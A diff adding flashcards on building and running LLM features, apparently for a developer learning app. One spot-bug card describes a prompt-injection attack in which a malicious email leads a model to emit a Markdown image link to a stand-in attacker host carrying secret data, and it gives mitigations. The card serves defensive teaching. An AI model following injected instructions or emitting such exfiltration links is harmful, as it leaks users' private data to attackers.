@@ -132,6 +132,221 @@
           ]
         }
       ]
+    },
+    {
+      "id": "llm-building",
+      "name": "Building LLM Features",
+      "description": "System prompts, structured output, streaming, choosing between prompting, RAG and fine-tuning, chunking and vector search, agents and MCP.",
+      "cards": [
+        {
+          "id": "llm-system-prompts",
+          "type": "flip",
+          "difficulty": 2,
+          "tags": ["llm.prompting"],
+          "prompt": "What are system, user and assistant messages for in a chat-model API?",
+          "answer": "The system prompt sets durable instructions — role, rules, output format, tone, what tools exist. User messages carry the request and any supplied data; assistant messages are the model's previous turns, which you resend each time because the API itself is stateless.",
+          "explanation": "Because the whole conversation is resent each call, history grows cost and latency — trim or summarise it. Put stable instructions first and keep them fixed, which also lets providers cache that prefix. Do not rely on the system prompt to keep secrets from the user: assume anything in context can be extracted.",
+          "prerequisites": ["llm-prompt-structure"],
+          "resources": [
+            { "title": "OpenAI Cookbook — Techniques to improve reliability", "url": "https://cookbook.openai.com/articles/techniques_to_improve_reliability", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-structured-output",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["llm.structured-output"],
+          "prompt": "How do you get reliable machine-readable output from an LLM?",
+          "answer": "Use the provider's structured-output or tool-calling feature with a JSON Schema, which constrains generation to valid JSON of that shape. Then validate the result in code anyway (Pydantic, Zod) and handle failures with a retry that includes the validation error.",
+          "explanation": "Asking politely for JSON in prose works most of the time, which is the problem — the failures arrive in production. Keep schemas simple, give fields clear names and descriptions, and include an explicit way for the model to report \"cannot answer\" rather than inventing values.",
+          "prerequisites": ["llm-tool-use", "ts-assertion-vs-guard"],
+          "resources": [
+            { "title": "JSON Schema — Getting started", "url": "https://json-schema.org/learn/getting-started-step-by-step", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-streaming",
+          "type": "flip",
+          "difficulty": 2,
+          "tags": ["llm.ux", "web.realtime"],
+          "prompt": "Why stream LLM responses, and what does it change in your code?",
+          "answer": "Generation takes seconds; streaming tokens as they are produced (usually over Server-Sent Events) cuts perceived latency to the time-to-first-token and lets users start reading or cancel early. Your code must handle partial output, cancellation, errors mid-stream, and assembling the final message for storage.",
+          "explanation": "Measure time-to-first-token and tokens per second separately from total latency. Structured output and tool calls also stream, but must be buffered until complete before being parsed or executed.",
+          "prerequisites": ["web-realtime"],
+          "resources": [
+            { "title": "MDN — Using server-sent events", "url": "https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-prompt-rag-finetune",
+          "type": "compare",
+          "difficulty": 4,
+          "tags": ["llm.architecture"],
+          "prompt": "Prompting vs RAG vs fine-tuning",
+          "answer": "Prompting (instructions and examples in context) is fastest to iterate; RAG supplies relevant, up-to-date knowledge at request time from your documents; fine-tuning changes the model's weights to adjust behaviour, style or format consistently.",
+          "columns": {
+            "left": { "title": "Prompting / RAG", "points": ["Prompting: instructions + few-shot examples", "RAG: retrieve relevant docs per request", "Knowledge stays current and citable", "No training pipeline needed"] },
+            "right": { "title": "Fine-tuning", "points": ["Adjusts model weights on your examples", "Consistent style, format, narrow skills", "Weak and unreliable for injecting facts", "Needs data curation, evals, retraining"] }
+          },
+          "explanation": "Fine-tuning is poor at teaching facts — it will blend them unreliably and cannot cite sources — while RAG handles knowledge that changes and needs attribution. Try prompting first, add RAG for knowledge, and fine-tune only for behaviour you cannot get otherwise, with an eval set proving the gain.",
+          "prerequisites": ["llm-rag"],
+          "resources": [
+            { "title": "Hugging Face — LLM course", "url": "https://huggingface.co/learn/llm-course/chapter1/1", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-chunking",
+          "type": "scenario",
+          "difficulty": 3,
+          "tags": ["llm.rag", "llm.embeddings"],
+          "prompt": "Your RAG system retrieves chunks that start mid-sentence and miss the table a question is about. How should documents be chunked?",
+          "answer": "Split along the document's structure — headings, sections, paragraphs, whole tables and code blocks — rather than fixed character counts, with modest overlap, and attach metadata (title, section path, source URL, date) to every chunk. Prepending a short document-level context to each chunk before embedding improves retrieval.",
+          "explanation": "Chunks too small lose context; too large dilute the embedding and waste the context window. Evaluate chunking choices against real questions, and store the chunk-to-source mapping so answers can cite where they came from.",
+          "prerequisites": ["llm-rag", "ai-embeddings"],
+          "resources": [
+            { "title": "Pinecone — Chunking strategies for LLM applications", "url": "https://www.pinecone.io/learn/chunking-strategies/", "kind": "article" }
+          ]
+        },
+        {
+          "id": "llm-vector-search",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["llm.embeddings", "search.vector"],
+          "prompt": "How does vector search find similar documents quickly, and do you need a dedicated vector database?",
+          "answer": "Approximate nearest-neighbour indexes (HNSW graphs, IVF) find the closest embeddings in sub-linear time by trading a little recall for large speed-ups. Postgres with pgvector, search engines (OpenSearch, Elasticsearch) and dedicated stores all provide them.",
+          "explanation": "For most applications an extension on the database you already run is enough, and keeps metadata filtering and access control in one place. Combine vector with keyword (BM25) retrieval and rerank the merged results — hybrid search beats either alone.",
+          "prerequisites": ["llm-rag", "nosql-search-engine"],
+          "resources": [
+            { "title": "pgvector — Open-source vector similarity search for Postgres", "url": "https://github.com/pgvector/pgvector", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-agents",
+          "type": "flip",
+          "difficulty": 4,
+          "tags": ["llm.agents"],
+          "prompt": "What is an LLM agent, and what makes one reliable?",
+          "answer": "A loop in which the model chooses tools to call, your code executes them and returns results, and the model continues until it decides the task is done. Reliability comes from few, well-designed tools with clear errors, tight scopes and permissions, step and budget limits, human approval for irreversible actions, and evals of full trajectories.",
+          "explanation": "Every extra step compounds the chance of error, so prefer deterministic workflows with LLM calls at specific points when the path is known, and reserve open-ended agents for tasks that genuinely need planning. Log every tool call for debugging and audit.",
+          "prerequisites": ["llm-tool-use", "llm-prompt-injection"],
+          "resources": [
+            { "title": "Anthropic — Building effective agents", "url": "https://www.anthropic.com/engineering/building-effective-agents", "kind": "article" }
+          ]
+        },
+        {
+          "id": "llm-mcp",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["llm.tools", "llm.protocols"],
+          "prompt": "What is the Model Context Protocol (MCP)?",
+          "answer": "An open protocol that standardises how AI applications connect to external tools and data: an MCP server exposes tools, resources and prompts over a common interface, and any MCP-capable client (an IDE assistant, a chat app, an agent framework) can use them without bespoke integration code.",
+          "explanation": "It turns many-to-many integrations into one protocol, like LSP did for editors and languages. Treat third-party MCP servers as code you are installing: they run with the permissions you give them and their tool descriptions and outputs can carry prompt injection.",
+          "prerequisites": ["llm-tool-use"],
+          "resources": [
+            { "title": "Model Context Protocol — Introduction", "url": "https://modelcontextprotocol.io/introduction", "kind": "docs" }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "llm-production",
+      "name": "LLMs in Production",
+      "description": "Cost and latency levers, caching, model selection, guardrails, data-exfiltration risks, evaluation metrics and observability.",
+      "cards": [
+        {
+          "id": "llm-cost-latency",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["llm.cost", "llm.performance"],
+          "prompt": "What are the main levers for reducing LLM cost and latency?",
+          "answer": "Use the smallest model that passes your evals and route only hard requests to larger ones; shrink prompts (retrieve less, summarise history); cache stable prompt prefixes and repeated responses; cap output length; batch offline work through batch APIs; and parallelise independent calls.",
+          "explanation": "Output tokens are typically much slower and pricier than input tokens, so concise responses help most. Measure cost and latency per feature alongside quality — the cheapest model that meets the quality bar is the right one, and that answer changes as models improve.",
+          "prerequisites": ["llm-tokens"],
+          "resources": [
+            { "title": "OpenAI Cookbook — Model selection guide", "url": "https://cookbook.openai.com/examples/partners/model_selection_guide/model_selection_guide", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-prompt-caching",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["llm.caching", "llm.cost"],
+          "prompt": "What is prompt (prefix) caching, and how do you structure prompts to benefit from it?",
+          "answer": "Providers can reuse the computed state for a prompt prefix that repeats exactly across requests, charging less and responding faster for the cached part. Put stable content first — system prompt, tool definitions, large reference documents — and variable content (the user's question) last.",
+          "explanation": "Any change early in the prompt, even a timestamp, invalidates everything after it, so keep volatile values out of the prefix. It pairs naturally with long system prompts, few-shot examples and multi-turn conversations. Response caching (same input, same output) is a separate application-level technique.",
+          "prerequisites": ["llm-system-prompts"],
+          "resources": [
+            { "title": "Anthropic docs — Prompt caching", "url": "https://docs.anthropic.com/en/docs/build-with-claude/prompt-caching", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-guardrails",
+          "type": "scenario",
+          "difficulty": 4,
+          "tags": ["llm.safety", "llm.security"],
+          "prompt": "A customer-support bot must not give legal advice, leak other customers' data, or say anything abusive. Where do you enforce that?",
+          "answer": "In layers around the model: least-privilege data access (the bot can only query the current customer's records — enforced in code, not the prompt), input and output classifiers or moderation, scoped instructions, deterministic checks on outputs (PII detection, allow-listed actions), and escalation to a human.",
+          "explanation": "Instructions reduce bad behaviour but cannot guarantee it; only controls outside the model can. Log and review flagged conversations, and red-team with adversarial prompts before launch and continuously after.",
+          "prerequisites": ["llm-prompt-injection", "sec-access-models"],
+          "resources": [
+            { "title": "OWASP Top 10 for LLM Applications", "url": "https://genai.owasp.org/llm-top-10/", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-exfiltration",
+          "type": "spot-bug",
+          "difficulty": 5,
+          "tags": ["llm.security", "appsec.exfiltration"],
+          "prompt": "The assistant reads user emails and renders its answer as Markdown. How can an attacker steal data without any tool calls?",
+          "code": "email_text = inbox.latest().body           # untrusted content\nanswer = llm(f'Summarise this for the user:\\n{email_text}')\nreturn render_markdown(answer)              # images and links auto-load",
+          "lang": "python",
+          "answer": "A malicious email can inject instructions telling the model to output an image such as `![](https://evil.example/log?d=<secret data>)`. When the client renders the Markdown, the browser fetches that URL and sends the data to the attacker. Block or proxy external images and links in model output, or only allow approved domains.",
+          "explanation": "Any channel that makes a request to an attacker-controlled URL — images, link previews, tool calls with URLs — can exfiltrate what the model can see. The combination of private data, untrusted content and an exfiltration channel is the dangerous one; remove at least one of the three.",
+          "prerequisites": ["llm-prompt-injection", "web-csp"],
+          "resources": [
+            { "title": "OWASP Top 10 for LLM Applications", "url": "https://genai.owasp.org/llm-top-10/", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-eval-metrics",
+          "type": "flip",
+          "difficulty": 4,
+          "tags": ["llm.evals"],
+          "prompt": "Which evaluation methods fit which kinds of LLM output?",
+          "answer": "Exact match or schema validation for extraction and classification; execution-based checks for code (run the tests); retrieval metrics (recall@k, MRR) for RAG retrieval; groundedness checks that answers are supported by retrieved sources; and LLM-as-judge with a clear rubric, calibrated against human ratings, for open-ended text.",
+          "explanation": "Judges have biases — favouring longer answers, their own style, and the first option — so use pairwise or rubric scoring and spot-check them. Keep a fixed regression set from real traffic and failures, and track results per prompt and model version.",
+          "prerequisites": ["llm-evals"],
+          "resources": [
+            { "title": "OpenAI Cookbook — Getting started with evals", "url": "https://cookbook.openai.com/examples/evaluation/getting_started_with_openai_evals", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-observability",
+          "type": "flip",
+          "difficulty": 3,
+          "tags": ["llm.ops", "obs.tracing"],
+          "prompt": "What should you log and monitor for an LLM feature in production?",
+          "answer": "For every call: prompt and model version, inputs and outputs (with PII handling), token counts, latency, cost, tool calls and their results, retrieval results for RAG, and user feedback signals. Trace multi-step chains and agent loops end to end.",
+          "explanation": "Without this you cannot debug a bad answer or detect regressions after a prompt or model change. Sample conversations for human review, alert on cost and error spikes, and feed real failures back into the eval set. OpenTelemetry has semantic conventions for generative-AI spans.",
+          "prerequisites": ["obs-opentelemetry"],
+          "resources": [
+            { "title": "OpenTelemetry — Semantic conventions for generative AI", "url": "https://opentelemetry.io/docs/specs/semconv/gen-ai/", "kind": "docs" }
+          ]
+        },
+        {
+          "id": "llm-model-selection",
+          "type": "scenario",
+          "difficulty": 3,
+          "tags": ["llm.architecture"],
+          "prompt": "How do you choose which model to use for a feature?",
+          "answer": "Build a representative eval set first, then test candidate models against it on quality, latency, cost, context length, and required features (tool use, structured output, vision). Weigh deployment constraints: data residency, privacy terms, self-hosting needs. Keep the model behind an abstraction so it can be swapped as better options appear.",
+          "explanation": "Public leaderboards are a starting point, not an answer — your task and data decide. Different steps of one pipeline can use different models: a small fast one for routing and extraction, a larger one for hard reasoning.",
+          "prerequisites": ["llm-eval-metrics", "llm-cost-latency"],
+          "resources": [
+            { "title": "Hugging Face — Open LLM evaluation resources", "url": "https://huggingface.co/docs/leaderboards/index", "kind": "docs" }
+          ]
+        }
+      ]
     }
   ]
 }
